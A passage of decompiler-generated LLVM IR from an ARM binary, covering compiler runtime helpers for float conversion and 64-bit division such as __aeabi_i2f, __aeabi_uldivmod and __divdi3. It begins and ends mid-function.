  %v1_16ed4 = phi i32 [ %v1_16ec8, %.thread13 ], [ %v4_16ec8, %bb89 ]
  %v1_16ed0 = and i32 %v1_16ed4, 12582912
  %v2_16ed0 = icmp eq i32 %v1_16ed0, 0
  br i1 %v2_16ed0, label %bb90, label %.thread15

bb90:                                             ; preds = %.thread14
  %v4_16ed4 = mul i32 %v1_16ed4, 4
  store i32 %v4_16ed4, i32* %r0.global-to-local, align 4
  %v2_16ed8 = add i32 %v1_16ed8, -2
  store i32 %v2_16ed8, i32* %r2.global-to-local, align 4
  br label %.thread15

.thread15:                                        ; preds = %.thread14, %bb90
  %v0_16ee4 = phi i32 [ %v1_16ed8, %.thread14 ], [ %v2_16ed8, %bb90 ]
  %v1_16ee0 = phi i32 [ %v1_16ed4, %.thread14 ], [ %v4_16ed4, %bb90 ]
  %v2_16edc = icmp ugt i32 %v1_16ee0, 8388607
  br i1 %v2_16edc, label %bb92, label %bb91

bb91:                                             ; preds = %.thread15
  %v3_16ee0 = mul i32 %v1_16ee0, 2
  store i32 %v3_16ee0, i32* %r0.global-to-local, align 4
  br label %bb92

bb92:                                             ; preds = %.thread15, %bb91
  %v3_16ee8 = phi i32 [ %v1_16ee0, %.thread15 ], [ %v3_16ee0, %bb91 ]
  %v1_16ee4 = phi i32 [ 0, %.thread15 ], [ 1, %bb91 ]
  %v4_16ee4 = sub i32 %v0_16ee4, %v1_16ee4
  store i32 %v4_16ee4, i32* %r2.global-to-local, align 4
  %v7_16ee4108 = sub i32 %v1_16ee4, %v4_16ee4
  %v9_16ee4 = and i32 %v7_16ee4108, %v0_16ee4
  %v10_16ee4 = icmp slt i32 %v9_16ee4, 0
  %v11_16ee4 = icmp slt i32 %v4_16ee4, 0
  %v2_16ee8 = xor i1 %v11_16ee4, %v10_16ee4
  br i1 %v2_16ee8, label %.thread75, label %bb93

.thread75:                                        ; preds = %bb92
  %v4_16eec = sub i32 0, %v4_16ee4
  store i32 %v4_16eec, i32* %r2.global-to-local, align 4
  %v10_16ef4 = lshr i32 %v3_16ee8, %v4_16eec
  %v11_16ef4 = or i32 %v10_16ef4, %v1_16e50
  store i32 %v11_16ef4, i32* %r0.global-to-local, align 4
  br label %bb94

bb93:                                             ; preds = %bb92
  %v7_16ee86672 = mul i32 %v4_16ee4, 8388608
  %v8_16ee86773 = add i32 %v7_16ee86672, %v3_16ee8
  %v5_16ef0 = or i32 %v8_16ee86773, %v1_16e50
  store i32 %v5_16ef0, i32* %r0.global-to-local, align 4
  br label %bb94

bb94:                                             ; preds = %.thread24, %bb105, %bb99, %dec_label_pc_16f4c, %bb96, %dec_label_pc_16f2c, %bb93, %.thread75
  %v1_16ef8 = phi i32 [ %v5_16ef0, %bb93 ], [ %v11_16ef4, %.thread75 ], [ %arg1, %dec_label_pc_16f2c ], [ %v0_16f14.pre, %bb96 ], [ %v2_16f4c, %dec_label_pc_16f4c ], [ %v2_16f50, %bb99 ], [ %v1_16f90, %bb105 ], [ %v2_16f90, %.thread24 ]
  ret i32 %v1_16ef8

dec_label_pc_16efc:                               ; preds = %bb83
  %v2_16efc = icmp eq i32 %v0_16e38, 0
  %v1_16f00 = xor i32 %storemerge1, 8388608
  br i1 %v2_16efc, label %.thread16, label %.thread17

.thread16:                                        ; preds = %dec_label_pc_16efc
  %v2_16f04 = xor i32 %v1_16e20.v2_16e24, 8388608
  store i32 %v2_16f04, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_16e40

.thread17:                                        ; preds = %dec_label_pc_16efc
  %v2_16f0c = add i32 %v1_16e38, -1
  store i32 %v2_16f0c, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_16e40

dec_label_pc_16f14:                               ; preds = %entry, %bb, %bb78, %bb79, %bb80
  %v2_16f14 = mul i32 %v0_16f14.pre, 2
  store i32 %v2_16f14, i32* %r3.global-to-local, align 4
  %v3_16f18 = sdiv i32 %v2_16ddc, 16777216
  %v4_16f18 = sub nsw i32 -1, %v3_16f18
  %v2_16ddc.off109 = add i32 %v2_16ddc, 33554431
  %tmp114 = icmp ult i32 %v2_16ddc.off109, 16777216
  br i1 %tmp114, label %.thread21, label %bb95

bb95:                                             ; preds = %dec_label_pc_16f14
  %v2_16f14.off = add i32 %v2_16f14, 33554431
  %tmp115 = icmp ult i32 %v2_16f14.off, 16777216
  br i1 %tmp115, label %bb102, label %dec_label_pc_16f24

dec_label_pc_16f24:                               ; preds = %bb95
  %v4_16f24 = icmp eq i32 %v2_16f14, %v2_16ddc
  br i1 %v4_16f24, label %dec_label_pc_16f38, label %dec_label_pc_16f2c

dec_label_pc_16f2c:                               ; preds = %dec_label_pc_16f24
  br i1 %v4_16ddc, label %bb96, label %bb94

bb96:                                             ; preds = %dec_label_pc_16f2c
  store i32 %v0_16f14.pre, i32* %r0.global-to-local, align 4
  br label %bb94

dec_label_pc_16f38:                               ; preds = %dec_label_pc_16f24
  %v4_16f38 = icmp eq i32 %v0_16f14.pre, %arg1
  br i1 %v4_16f38, label %bb98, label %bb97

bb97:                                             ; preds = %dec_label_pc_16f38
  store i32 0, i32* %r0.global-to-local, align 4
  br label %bb98

bb98:                                             ; preds = %dec_label_pc_16f38, %bb97
  %v0_16f40 = load i32, i32* @lr, align 4
  %v2_16f40 = xor i1 %v4_16f38, true
  call void @__pseudo_cond_branch(i1 %v2_16f40, i32 %v0_16f40)
  %v0_16f44 = load i32, i32* %r2.global-to-local, align 4
  %v3_16f44 = icmp ult i32 %v0_16f44, 16777216
  br i1 %v3_16f44, label %dec_label_pc_16f4c, label %dec_label_pc_16f58

dec_label_pc_16f4c:                               ; preds = %bb98
  %v0_16f4c = load i32, i32* %r0.global-to-local, align 4
  %v1_16f4c = icmp slt i32 %v0_16f4c, 0
  %v2_16f4c = mul i32 %v0_16f4c, 2
  store i32 %v2_16f4c, i32* %r0.global-to-local, align 4
  br i1 %v1_16f4c, label %bb99, label %bb94

bb99:                                             ; preds = %dec_label_pc_16f4c
  %v2_16f50 = or i32 %v2_16f4c, -2147483648
  store i32 %v2_16f50, i32* %r0.global-to-local, align 4
  br label %bb94

dec_label_pc_16f58:                               ; preds = %bb98
  %v1_16f58 = add i32 %v0_16f44, 33554432
  store i32 %v1_16f58, i32* %r2.global-to-local, align 4
  %v2_16f58 = icmp ugt i32 %v0_16f44, -33554433
  br i1 %v2_16f58, label %bb101, label %bb100

bb100:                                            ; preds = %dec_label_pc_16f58
  %v1_16f5c = load i32, i32* %r0.global-to-local, align 4
  %v2_16f5c = add i32 %v1_16f5c, 8388608
  store i32 %v2_16f5c, i32* %r0.global-to-local, align 4
  br label %bb101

bb101:                                            ; preds = %dec_label_pc_16f58, %bb100
  %v0_16f60 = load i32, i32* @lr, align 4
  %v2_16f60 = xor i1 %v2_16f58, true
  call void @__pseudo_cond_branch(i1 %v2_16f60, i32 %v0_16f60)
  %v0_16f64 = load i32, i32* %r0.global-to-local, align 4
  %v1_16f64 = and i32 %v0_16f64, -2147483648
  store i32 %v1_16f64, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_16f68

dec_label_pc_16f68:                               ; preds = %dec_label_pc_16e70, %bb101
  %v0_16f68 = phi i32 [ %v1_16e50, %dec_label_pc_16e70 ], [ %v1_16f64, %bb101 ]
  %v1_16f6c = or i32 %v0_16f68, 2139095040
  store i32 %v1_16f6c, i32* %r0.global-to-local, align 4
  ret i32 %v1_16f6c

bb102:                                            ; preds = %bb95
  store i32 %v4_16f18, i32* %r2.global-to-local, align 4
  store i32 %v0_16f14.pre, i32* %r0.global-to-local, align 4
  br label %.thread22

.thread21:                                        ; preds = %dec_label_pc_16f14
  store i32 %v4_16f18, i32* %r2.global-to-local, align 4
  %v4_16f7c = sdiv i32 %v2_16f14, 16777216
  %v5_16f7c = sub nsw i32 -1, %v4_16f7c
  store i32 %v5_16f7c, i32* %r3.global-to-local, align 4
  %v2_16f14.off110 = add i32 %v2_16f14, 33554431
  %tmp116 = icmp ult i32 %v2_16f14.off110, 16777216
  br i1 %tmp116, label %bb103, label %.thread22

.thread22:                                        ; preds = %bb102, %.thread21
  %v1_16f80 = phi i32 [ %v0_16f14.pre, %bb102 ], [ %arg1, %.thread21 ]
  br label %bb103

bb103:                                            ; preds = %.thread21, %.thread22
  %v2_16f8c = phi i32 [ %v0_16f14.pre, %.thread21 ], [ %v1_16f80, %.thread22 ]
  %v1_16f90 = phi i32 [ %arg1, %.thread21 ], [ %v1_16f80, %.thread22 ]
  %v3_16f84 = mul i32 %v1_16f90, 512
  store i32 %v3_16f84, i32* %r2.global-to-local, align 4
  %v5_16f84 = icmp eq i32 %v3_16f84, 0
  br i1 %v5_16f84, label %bb104, label %.thread24

bb104:                                            ; preds = %bb103
  %v4_16f88 = mul i32 %v2_16f8c, 512
  store i32 %v4_16f88, i32* %r3.global-to-local, align 4
  %v6_16f88 = icmp eq i32 %v4_16f88, 0
  br i1 %v6_16f88, label %bb105, label %.thread24

bb105:                                            ; preds = %bb104
  %v5_16f8c = icmp eq i32 %v1_16f90, %v2_16f8c
  br i1 %v5_16f8c, label %bb94, label %.thread24

.thread24:                                        ; preds = %bb103, %bb104, %bb105
  %v2_16f90 = or i32 %v1_16f90, 4194304
  store i32 %v2_16f90, i32* %r0.global-to-local, align 4
  br label %bb94

; uselistorder directives
  uselistorder i32 %v2_16f90, { 1, 0 }
  uselistorder i32 %v4_16f88, { 1, 0 }
  uselistorder i32 %v3_16f84, { 1, 0 }
  uselistorder i32 %v1_16f90, { 3, 0, 1, 2 }
  uselistorder i32 %v1_16f80, { 1, 0 }
  uselistorder i32 %v2_16f50, { 1, 0 }
  uselistorder i32 %v2_16f4c, { 1, 0, 2 }
  uselistorder i32 %v0_16f44, { 2, 1, 0 }
  uselistorder i1 %v4_16f38, { 1, 0 }
  uselistorder i32 %v4_16f18, { 1, 0 }
  uselistorder i32 %v2_16f14, { 1, 3, 0, 2, 4 }
  uselistorder i32 %v2_16f0c, { 1, 0 }
  uselistorder i32 %v2_16f04, { 1, 0 }
  uselistorder i32 %v1_16f00, { 1, 0 }
  uselistorder i32 %v4_16ee4, { 1, 2, 3, 0, 4 }
  uselistorder i32 %v1_16ee4, { 1, 0 }
  uselistorder i32 %v3_16ee0, { 1, 0 }
  uselistorder i32 %v1_16ee0, { 1, 0, 2 }
  uselistorder i32 %v4_16ed4, { 1, 0 }
  uselistorder i32 %v1_16ed4, { 1, 0, 2 }
  uselistorder i32 %v4_16ec8, { 1, 0 }
  uselistorder i32 %v1_16ec8, { 1, 0, 2 }
  uselistorder i32 %v4_16ebc, { 1, 0 }
  uselistorder i32 %v1_16ebc, { 1, 0, 2 }
  uselistorder i32 %v4_16eb0, { 1, 0 }
  uselistorder i32 %v1_16ea4, { 0, 2, 1 }
  uselistorder i32 %v5_16e9c, { 1, 0, 3, 2 }
  uselistorder i32 %v3_16e9c, { 1, 0 }
  uselistorder i32 %v3_16e70, { 1, 0 }
  uselistorder i32 %v0_16e9c, { 0, 1, 3, 2, 4, 5 }
  uselistorder i32 %v1_16e50, { 3, 0, 1, 2, 4 }
  uselistorder i32 %v6_16e4c, { 0, 2, 1 }
  uselistorder i32 %v0_16e40, { 0, 1, 2, 4, 3, 5 }
  uselistorder i32 %v1_16e38, { 3, 1, 2, 0 }
  uselistorder i32 %v0_16e38, { 3, 2, 1, 0 }
  uselistorder i32 %storemerge1, { 1, 0 }
  uselistorder i32 %v1_16e20.v2_16e24, { 2, 1, 0, 3 }
  uselistorder i32 %v4_16df8, { 1, 0, 2, 3 }
  uselistorder i32 %v3_16de0, { 1, 0, 3, 2 }
  uselistorder i32 %v0_16f14.pre, { 5, 6, 7, 0, 8, 1, 4, 9, 2, 3 }
  uselistorder i32 %v2_16ddc, { 0, 2, 4, 3, 1, 6, 5 }
  uselistorder i32* %r3.global-to-local, { 0, 1, 2, 3, 4, 5, 7, 6, 8, 9 }
  uselistorder i32* %r2.global-to-local, { 0, 18, 1, 2, 16, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 14, 13, 15, 17 }
  uselistorder i32* %r0.global-to-local, { 2, 3, 4, 8, 5, 9, 6, 7, 10, 11, 12, 13, 15, 14, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 1, 26, 27, 0 }
  uselistorder i32 4194304, { 1, 0 }
  uselistorder i32 33554432, { 3, 0, 2, 1 }
  uselistorder i32 8388607, { 1, 0, 2 }
  uselistorder i32 1048576, { 0, 22, 1, 2, 3, 23, 24, 16, 4, 5, 6, 29, 7, 8, 30, 31, 18, 19, 9, 10, 25, 26, 27, 21, 28, 11, 17, 12, 20, 13, 14, 15 }
  uselistorder i32 512, { 0, 1, 6, 8, 2, 3, 4, 5, 9, 7 }
  uselistorder i32 253, { 2, 3, 4, 5, 0, 6, 1 }
  uselistorder i32 8388608, { 10, 11, 12, 5, 13, 0, 6, 1, 7, 2, 3, 4, 8, 14, 9 }
  uselistorder i32 %arg1, { 5, 4, 0, 3, 6, 1, 2, 7 }
  uselistorder label %.thread24, { 2, 1, 0 }
  uselistorder label %bb103, { 1, 0 }
  uselistorder label %.thread22, { 1, 0 }
  uselistorder label %dec_label_pc_16f68, { 1, 0 }
  uselistorder label %bb101, { 1, 0 }
  uselistorder label %bb98, { 1, 0 }
  uselistorder label %dec_label_pc_16f14, { 4, 3, 2, 1, 0 }
  uselistorder label %bb92, { 1, 0 }
  uselistorder label %.thread15, { 1, 0 }
  uselistorder label %.thread14, { 1, 0 }
  uselistorder label %.thread13, { 1, 0 }
  uselistorder label %.thread12, { 1, 0 }
  uselistorder label %bb85, { 1, 0 }
  uselistorder label %dec_label_pc_16e60, { 1, 0 }
  uselistorder label %dec_label_pc_16e40, { 1, 0, 2 }
  uselistorder label %bb83, { 1, 0 }
  uselistorder label %.thread11, { 1, 0 }
}

define i32 @__aeabi_ui2f() local_unnamed_addr {
entry:
  store i32 0, i32* @r3, align 4
  %v0_16f9c = call i32 @function_16fa8()
  ret i32 %v0_16f9c
}

define i32 @__aeabi_i2f(i32 %arg1) local_unnamed_addr {
entry:
  %v2_16fa0 = icmp slt i32 %arg1, 0
  br i1 %v2_16fa0, label %bb, label %bb2

bb:                                               ; preds = %entry
  %v2_16fa4 = sub i32 0, %arg1
  br label %bb2

bb2:                                              ; preds = %entry, %bb
  %v3_16fa4 = phi i32 [ %arg1, %entry ], [ %v2_16fa4, %bb ]
  ret i32 %v3_16fa4

; uselistorder directives
  uselistorder i32 %arg1, { 1, 2, 0 }
  uselistorder label %bb2, { 1, 0 }
}

define i32 @function_16fa8() local_unnamed_addr {
dec_label_pc_16fa8:
  %v0_16fa8 = load i32, i32* @r0, align 4
  store i32 %v0_16fa8, i32* @ip, align 4
  %v2_16fa8 = icmp eq i32 %v0_16fa8, 0
  %v0_16fac = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v2_16fa8, i32 %v0_16fac)
  %v0_16fb0 = load i32, i32* @r3, align 4
  %v1_16fb0 = or i32 %v0_16fb0, 1258291200
  store i32 %v1_16fb0, i32* @r3, align 4
  %v0_16fb4 = load i32, i32* @r0, align 4
  %v2_16fbc = call i32 @function_17000(i32 0, i32 %v0_16fb4)
  ret i32 %v2_16fbc
}

define i32 @__floatundisf(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 %arg2, i32* @r1, align 4
  store i32 %arg1, i32* @r0, align 4
  %v2_16fc0 = or i32 %arg2, %arg1
  %v4_16fc0 = icmp eq i32 %v2_16fc0, 0
  %v0_16fc4 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v4_16fc0, i32 %v0_16fc4)
  store i32 0, i32* @r3, align 4
  %v0_16fcc = call i32 @function_16fe8()
  ret i32 %v0_16fcc
}

define i32 @__floatdisf(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v2_16fd0 = or i32 %arg2, %arg1
  %v4_16fd0 = icmp eq i32 %v2_16fd0, 0
  %v0_16fd4 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v4_16fd0, i32 %v0_16fd4)
  %v1_16fdc = icmp sgt i32 %arg2, -1
  call void @__pseudo_cond_branch(i1 %v1_16fdc, i32 ptrtoint (i32* @global_var_16fe8.746 to i32))
  %v1_16fe0 = sub i32 0, %arg1
  ret i32 %v1_16fe0

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
}

define i32 @function_16fe8() local_unnamed_addr {
dec_label_pc_16fe8:
  %v0_16fe8 = load i32, i32* @r1, align 4
  %v2_16fe8 = icmp eq i32 %v0_16fe8, 0
  br i1 %v2_16fe8, label %bb, label %.thread2

.thread2:                                         ; preds = %dec_label_pc_16fe8
  br label %bb7

bb:                                               ; preds = %dec_label_pc_16fe8
  br label %bb7

bb7:                                              ; preds = %.thread2, %bb
  ret i32 0

; uselistorder directives
  uselistorder label %bb7, { 1, 0 }
}

define i32 @function_17000(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_17000:
  %v0_17000 = load i32, i32* @r3, align 4
  %v1_17000 = add i32 %v0_17000, -8388608
  %v0_17008 = load i32, i32* @ip, align 4
  %v2_17008 = icmp ugt i32 %v0_17008, 65535
  br i1 %v2_17008, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_17000
  %v2_1700c = and i32 %v0_17008, 32768
  %v3_1700c = icmp eq i32 %v2_1700c, 0
  %v4_1700c = udiv i32 %v0_17008, 65536
  br i1 %v3_1700c, label %.thread, label %bb14

bb14:                                             ; preds = %bb
  br label %.thread

.thread:                                          ; preds = %bb, %dec_label_pc_17000, %bb14
  %v1_17018 = phi i32 [ %v0_17008, %dec_label_pc_17000 ], [ %v4_1700c, %bb ], [ %v4_1700c, %bb14 ]
  %v1_1701c = phi i32 [ 23, %dec_label_pc_17000 ], [ 23, %bb ], [ 7, %bb14 ]
  %v2_17014 = icmp ugt i32 %v1_17018, 255
  br i1 %v2_17014, label %bb15, label %.thread1

bb15:                                             ; preds = %.thread
  %v2_17018 = and i32 %v1_17018, 128
  %v3_17018 = icmp eq i32 %v2_17018, 0
  %v4_17018 = udiv i32 %v1_17018, 256
  br i1 %v3_17018, label %.thread1, label %bb16

bb16:                                             ; preds = %bb15
  %v2_1701c = add nsw i32 %v1_1701c, -8
  br label %.thread1

.thread1:                                         ; preds = %bb15, %.thread, %bb16
  %v1_17028 = phi i32 [ %v1_1701c, %.thread ], [ %v1_1701c, %bb15 ], [ %v2_1701c, %bb16 ]
  %v1_17024 = phi i32 [ %v1_17018, %.thread ], [ %v4_17018, %bb15 ], [ %v4_17018, %bb16 ]
  %v2_17020 = icmp ugt i32 %v1_17024, 15
  br i1 %v2_17020, label %bb17, label %.thread2

bb17:                                             ; preds = %.thread1
  %v2_17024 = and i32 %v1_17024, 8
  %v3_17024 = icmp eq i32 %v2_17024, 0
  %v4_17024 = udiv i32 %v1_17024, 16
  br i1 %v3_17024, label %.thread2, label %bb18

bb18:                                             ; preds = %bb17
  %v2_17028 = add nsw i32 %v1_17028, -4
  br label %.thread2

.thread2:                                         ; preds = %bb17, %.thread1, %bb18
  %v1_17030 = phi i32 [ %v1_17028, %.thread1 ], [ %v1_17028, %bb17 ], [ %v2_17028, %bb18 ]
  %v1_17038 = phi i32 [ %v1_17024, %.thread1 ], [ %v4_17024, %bb17 ], [ %v4_17024, %bb18 ]
  %v2_1702c = icmp ugt i32 %v1_17038, 3
  br i1 %v2_1702c, label %bb19, label %.thread3

bb19:                                             ; preds = %.thread2
  %v2_17030 = add nsw i32 %v1_17030, -2
  br label %bb20

.thread3:                                         ; preds = %.thread2
  %v5_17034 = udiv i32 %v1_17038, 2
  %v6_17034 = sub i32 %v1_17030, %v5_17034
  br label %bb20

bb20:                                             ; preds = %bb19, %.thread3
  %v0_17038 = phi i32 [ %v6_17034, %.thread3 ], [ %v2_17030, %bb19 ]
  %v4_17038 = udiv i32 %v1_17038, 8
  %v5_17038 = sub i32 %v0_17038, %v4_17038
  %tmp = mul i32 %v5_17038, -8388608
  %v5_1703c = add i32 %v1_17000, %tmp
  %v5_17040 = icmp slt i32 %v0_17038, %v4_17038
  br i1 %v5_17040, label %dec_label_pc_17060, label %dec_label_pc_17044

dec_label_pc_17044:                               ; preds = %bb20
  %v7_17044 = shl i32 %arg2, %v5_17038
  %v8_17044 = add i32 %v5_1703c, %v7_17044
  %v1_1704c = sub i32 32, %v5_17038
  %v3_17054 = add i32 %v1_1704c, -1
  %v4_17054 = shl i32 1, %v3_17054
  %v5_17054 = and i32 %v4_17054, %arg1
  %v6_17054 = icmp ne i32 %v5_17054, 0
  %v7_17054 = lshr i32 %arg1, %v1_1704c
  %v9_17054 = add i32 %v8_17044, %v7_17054
  %v10_17054 = zext i1 %v6_17054 to i32
  %v11_17054 = add i32 %v10_17054, %v9_17054
  %v25_17054 = icmp eq i32 %v11_17054, 0
  br i1 %v25_17054, label %bb21, label %bb22

bb21:                                             ; preds = %dec_label_pc_17044
  br label %bb22

bb22:                                             ; preds = %bb23, %dec_label_pc_17060, %dec_label_pc_17044, %bb21
  %v1_1705c = phi i32 [ %v11_17054, %dec_label_pc_17044 ], [ 0, %bb21 ], [ %v11_17070, %dec_label_pc_17060 ], [ 0, %bb23 ]
  ret i32 %v1_1705c

dec_label_pc_17060:                               ; preds = %bb20
  %v1_17068 = sub i32 0, %v5_17038
  %v3_17070 = sub i32 -1, %v5_17038
  %v4_17070 = shl i32 1, %v3_17070
  %v5_17070 = and i32 %v4_17070, %arg2
  %v6_17070 = icmp ne i32 %v5_17070, 0
  %v7_17070 = lshr i32 %arg2, %v1_17068
  %v9_17070 = add i32 %v5_1703c, %v7_17070
  %v10_17070 = zext i1 %v6_17070 to i32
  %v11_17070 = add i32 %v10_17070, %v9_17070
  %v25_17070 = icmp eq i32 %v11_17070, 0
  br i1 %v25_17070, label %bb23, label %bb22

bb23:                                             ; preds = %dec_label_pc_17060
  br label %bb22

; uselistorder directives
  uselistorder i32 %v11_17070, { 1, 0 }
  uselistorder i32 %v5_1703c, { 1, 0 }
  uselistorder i32 %v5_17038, { 1, 2, 3, 4, 0 }
  uselistorder i32 %v4_17038, { 1, 0 }
  uselistorder i32 %v0_17038, { 1, 0 }
  uselistorder i32 %v4_17024, { 1, 0 }
  uselistorder i32 %v1_17024, { 1, 0, 2, 3 }
  uselistorder i32 %v4_17018, { 1, 0 }
  uselistorder i32 %v1_17018, { 1, 0, 2, 3 }
  uselistorder i32 %v4_1700c, { 1, 0 }
  uselistorder i32 %v0_17008, { 1, 0, 2, 3 }
  uselistorder i32 -4, { 7, 8, 9, 29, 30, 31, 32, 10, 33, 34, 35, 11, 12, 37, 13, 14, 39, 0, 38, 40, 41, 42, 15, 16, 2, 17, 18, 19, 20, 21, 22, 23, 24, 25, 4, 5, 36, 26, 6, 43, 27, 3, 1, 28 }
  uselistorder i32 -8, { 1, 2, 3, 16, 17, 18, 21, 4, 19, 20, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 0 }
  uselistorder i32 23, { 1, 2, 0, 3, 4, 5, 6 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %bb22, { 0, 1, 3, 2 }
  uselistorder label %bb20, { 1, 0 }
  uselistorder label %.thread2, { 2, 0, 1 }
  uselistorder label %.thread1, { 2, 0, 1 }
  uselistorder label %.thread, { 2, 0, 1 }
}

define i32 @__aeabi_uldivmod(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v0_17084 = load i32, i32* @r0, align 4
  %v1_17084 = load i32, i32* @r1, align 4
  %v2_17084 = load i32, i32* @r2, align 4
  %v3_17084 = sext i32 %v0_17084 to i64
  %v4_17084 = sext i32 %v1_17084 to i64
  %v5_17084 = inttoptr i32 %v2_17084 to i64*
  %v6_17084 = call i64 @__gnu_uldivmod_helper(i64 %v3_17084, i64 %v4_17084, i64* %v5_17084)
  %v7_17084 = trunc i64 %v6_17084 to i32
  ret i32 %v7_17084
}

define i64 @__gnu_uldivmod_helper(i64 %a, i64 %b, i64* %remainder) local_unnamed_addr {
entry:
  %sl.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i64* %remainder to i32
  %tmp2 = trunc i64 %b to i32
  %tmp3 = trunc i64 %a to i32
  %tmp11 = call i32 @__decompiler_undefined_function_0()
  %v0_170a0 = load i32, i32* @r3, align 4
  %v4_170ac = udiv i32 %tmp3, %tmp
  %v5_170ac = sext i32 %v4_170ac to i64
  %v3_170b0 = mul i32 %v4_170ac, %v0_170a0
  store i32 %v3_170b0, i32* @ip, align 4
  %v4_170b4 = zext i32 %tmp to i64
  %v5_170b4 = mul nuw nsw i64 %v5_170ac, %v4_170b4
  %v6_170b4 = udiv i64 %v5_170b4, 4294967296
  %v7_170b4 = trunc i64 %v6_170b4 to i32
  %v8_170b4 = trunc i64 %v5_170b4 to i32
  %v4_170b8 = mul i32 %tmp, %tmp2
  %v5_170b8 = add i32 %v3_170b0, %v4_170b8
  %v2_170bc = add i32 %v5_170b8, %v7_170b4
  %v2_170c4 = sub i32 %tmp3, %v8_170b4
  %v3_170c4 = icmp uge i32 %tmp3, %v8_170b4
  %v3_170c8 = icmp eq i1 %v3_170c4, false
  %v4_170c8 = sub i32 %tmp2, %v2_170bc
  %v6_170c8 = sext i1 %v3_170c8 to i32
  %v7_170c8 = add i32 %v6_170c8, %v4_170c8
  store i32 %v7_170c8, i32* %sl.global-to-local, align 4
  %v1_170d4 = inttoptr i32 %tmp11 to i32*
  store i32 %v2_170c4, i32* %v1_170d4, align 4
  %v3_170d4 = add i32 %tmp11, 4
  %v4_170d4 = inttoptr i32 %v3_170d4 to i32*
  %v5_170d4 = load i32, i32* %sl.global-to-local, align 4
  store i32 %v5_170d4, i32* %v4_170d4, align 4
  ret i64 %v5_170ac

; uselistorder directives
  uselistorder i32 %v8_170b4, { 1, 0 }
  uselistorder i64 %v5_170b4, { 1, 0 }
  uselistorder i64 %v5_170ac, { 1, 0 }
  uselistorder i32 %tmp11, { 1, 0 }
  uselistorder i32 %tmp3, { 1, 0, 2 }
  uselistorder i32 %tmp2, { 1, 0 }
}

define i64 @__gnu_ldivmod_helper(i64 %a, i64 %b, i64* %remainder) local_unnamed_addr {
entry:
  %sl.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i64* %remainder to i32
  %tmp2 = trunc i64 %b to i32
  %tmp3 = trunc i64 %a to i32
  %tmp11 = call i32 @__decompiler_undefined_function_0()
  %v0_170e8 = load i32, i32* @r3, align 4
  %v4_170f4 = sdiv i32 %tmp3, %tmp
  %v5_170f4 = sext i32 %v4_170f4 to i64
  %v3_170f8 = mul i32 %v4_170f4, %v0_170e8
  %v4_170fc = zext i32 %tmp to i64
  %v5_170fc = mul nuw nsw i64 %v5_170f4, %v4_170fc
  %v6_170fc = udiv i64 %v5_170fc, 4294967296
  %v7_170fc = trunc i64 %v6_170fc to i32
  %v8_170fc = trunc i64 %v5_170fc to i32
  %v4_17100 = mul i32 %tmp, %tmp2
  %v5_17100 = add i32 %v3_170f8, %v4_17100
  %v2_17104 = add i32 %v5_17100, %v7_170fc
  %v2_1710c = sub i32 %tmp3, %v8_170fc
  %v3_1710c = icmp uge i32 %tmp3, %v8_170fc
  %v3_17110 = icmp eq i1 %v3_1710c, false
  %v4_17110 = sub i32 %tmp2, %v2_17104
  %v6_17110 = sext i1 %v3_17110 to i32
  %v7_17110 = add i32 %v6_17110, %v4_17110
  store i32 %v7_17110, i32* %sl.global-to-local, align 4
  %v1_1711c = inttoptr i32 %tmp11 to i32*
  store i32 %v2_1710c, i32* %v1_1711c, align 4
  %v3_1711c = add i32 %tmp11, 4
  %v4_1711c = inttoptr i32 %v3_1711c to i32*
  %v5_1711c = load i32, i32* %sl.global-to-local, align 4
  store i32 %v5_1711c, i32* %v4_1711c, align 4
  ret i64 %v5_170f4

; uselistorder directives
  uselistorder i32 %v8_170fc, { 1, 0 }
  uselistorder i64 %v5_170fc, { 1, 0 }
  uselistorder i64 %v5_170f4, { 1, 0 }
  uselistorder i32 %tmp11, { 1, 0 }
  uselistorder i32 %tmp3, { 1, 0, 2 }
  uselistorder i32 %tmp2, { 1, 0 }
}

define i64 @__divdi3(i64 %u, i64 %v) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %tmp = trunc i64 %v to i32
  store i32 %tmp, i32* %r1.global-to-local, align 4
  %tmp132 = trunc i64 %u to i32
  store i32 %tmp132, i32* %r0.global-to-local, align 4
  %v27_17128 = load i32, i32* @lr, align 4
  %v0_17134 = load i32, i32* %r1.global-to-local, align 4
  %v1_17134 = icmp slt i32 %v0_17134, 0
  br i1 %v1_17134, label %dec_label_pc_174bc, label %dec_label_pc_1715c

dec_label_pc_1715c:                               ; preds = %entry
  %v0_1714c = load i32, i32* @r2, align 4
  %v0_17150 = load i32, i32* @r3, align 4
  %v1_1715c = icmp slt i32 %v0_17150, 0
  br i1 %v1_1715c, label %dec_label_pc_174d4, label %dec_label_pc_17164

dec_label_pc_17164:                               ; preds = %dec_label_pc_174bc, %dec_label_pc_1715c, %dec_label_pc_174d4
  %v0_17150108 = phi i32 [ %v0_17150107, %dec_label_pc_174d4 ], [ %v0_17150103, %dec_label_pc_174bc ], [ %v0_17150, %dec_label_pc_1715c ]
  %v1_174a4 = phi i32 [ %v6_174d8, %dec_label_pc_174d4 ], [ %v0_17150103, %dec_label_pc_174bc ], [ %v0_17150, %dec_label_pc_1715c ]
  %v0_171ac60 = phi i32 [ %stack_var_-56.2, %dec_label_pc_174d4 ], [ -1, %dec_label_pc_174bc ], [ 0, %dec_label_pc_1715c ]
